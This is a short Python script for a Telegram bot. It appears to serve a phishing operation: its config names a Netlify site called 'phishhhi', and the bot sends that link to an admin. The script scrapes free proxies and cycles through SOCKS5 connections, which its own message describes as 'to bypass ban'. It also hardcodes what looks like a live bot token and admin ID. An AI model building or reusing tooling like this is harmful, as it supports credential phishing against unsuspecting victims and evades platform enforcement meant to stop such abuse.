import telebot
from telebot import apihelper
import requests
import time

# --- CONFIG ---
TOKEN = '8085353942:AAH-r1yJqPGNvPruBICBW4aFAh2IPJjy_Qw'
ADMIN_ID = '6671784926'
NETLIFY_URL = "https://phishhhi.netlify.app"

def get_proxy():
    print("Scavenging proxies to bypass ban...")
    try:
        r = requests.get("https://api.proxyscrape.com", timeout=10)
        return r.text.split('\r\n')
    except: return []

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start_cmd(message):
    if str(message.chat.id) == ADMIN_ID:
        msg = f"<b>🔥 v15.0 APEX-OVERLORD ACTIVE</b>\n\n🔗 Link: <code>{NETLIFY_URL}</code>\n🛡️ Status: <b>Online (Proxy)</b>"
        bot.send_message(message.chat.id, msg, parse_mode='HTML')

if __name__ == "__main__":
    proxies = get_proxy()
    connected = False
    for p in proxies:
        if not p: continue
        try:
            apihelper.proxy = {'https': f'socks5://{p}'}
            bot.get_me()
            print(f"✅ Connection Gold: {p}")
            connected = True
            break
        except: continue
    
    if connected:
        bot.polling(none_stop=True)
    else:
        print("❌ All proxies failed. Use a manual VPN in Termux.")

